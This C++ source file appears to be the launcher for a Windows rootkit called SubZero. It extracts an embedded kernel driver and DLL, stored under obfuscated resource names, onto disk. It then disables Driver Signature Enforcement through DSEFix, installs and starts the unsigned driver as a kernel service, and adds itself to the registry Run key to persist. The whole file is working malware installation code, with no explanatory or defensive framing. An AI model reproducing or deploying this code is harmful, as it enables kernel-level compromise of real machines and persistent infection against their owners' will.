#include "pch.h"
#include "resource.h"
#include "SubZeroLauncherCommon.h"
#include "../SubZeroDriver/SubZeroCommon.h"
#include "../SubZeroUtils/AutoRegistryKeyHandle.h"
#include "../SubZeroUtils/PeResource.h"
#include "../SubZeroUtils/ServiceManager.h"
#include "../SubZeroUtils/RegistryManager.h"
#include "../SubZeroUtils/DebugPrint.h"
#include "../SubZeroUtils/AutoHandle.h"

#include "../SubZeroCleanup/SubZeroCleanup.h"

extern "C" {
#include "../DSEFix/DSEFix.h"
}

const std::wstring DRIVER_RESOURCE_NAME(L"PUXY");
const std::wstring DLL_RESOURCE_NAME(L"NKUI");
AutoRegistryKeyHandle AutoRegKey(nullptr);

int wmain(int argc, wchar_t* argv[])
{
	//LoadLibraryA("S:\\Projects\\SubZeroRootkit\\x64\\Release\\SubZeroDLL.dll");
	//return 1;

	// Save resources to file system
	try {
		const PeResource driverResource(IDR_PUXY1, DRIVER_RESOURCE_NAME);
		driverResource.saveResourceToFileSystem(DRIVER_FULL_PATH);
		DEBUG_PRINT("[+] Driver extracted and saved to file system successfully");
	}
	catch (const Win32ErrorCodeException& exception) {				
		if (ERROR_FILE_EXISTS != exception.getErrorCode()) 
		{
			// Error extracting/saving resource
			DEBUG_PRINT(exception.what());
			SubZeroCleanup::Cleanup();
			return 1;
		}
	}

	 try {
		const PeResource libraryResource(IDR_NKUI1, DLL_RESOURCE_NAME);
		libraryResource.saveResourceToFileSystem(DLL_FULL_PATH);
		DEBUG_PRINT("[+] DLL extracted and saved to file system successfully");
	}
	catch (const Win32ErrorCodeException& exception) {
		if (ERROR_FILE_EXISTS != exception.getErrorCode()) 
		{
			// Error extracting/saving resource
			DEBUG_PRINT(exception.what());
			SubZeroCleanup::Cleanup();
			return 1;
		}
	}

	// Disable DSE protection using DSEFix
	DSEFixMain();
	DEBUG_PRINT("[+] DSE protection disabled");

	// Load driver
	try {
		ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
		serviceManager.installAndStart();
		DEBUG_PRINT("[+] Driver installed and started successfully");
	}
	catch (const Win32ErrorCodeException& exception) {
		DEBUG_PRINT(exception.what());
		SubZeroCleanup::Cleanup();
		return 1;
	}

	try {
		AutoRegKey.reset(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));

		// Set current file as startup file - note that the launcher register its current location (argv[0])
		// but the rest of the modules assume it's in the fixed path - LAUNCHER_FILE_PATH
		// TODO: 
		RegistryManager::SetRegistryValue(AutoRegKey.get(), REG_VALUE_NAME, REG_SZ, static_cast<PVOID>(argv[0]), MAX_PATH);

		DEBUG_PRINT("[+] Successfully Added as RUN value");
	}
	catch (const Win32ErrorCodeException& exception) {
		SubZeroCleanup::Cleanup();
		DEBUG_PRINT(exception.what());
		return 1;
	}
	return 0;
}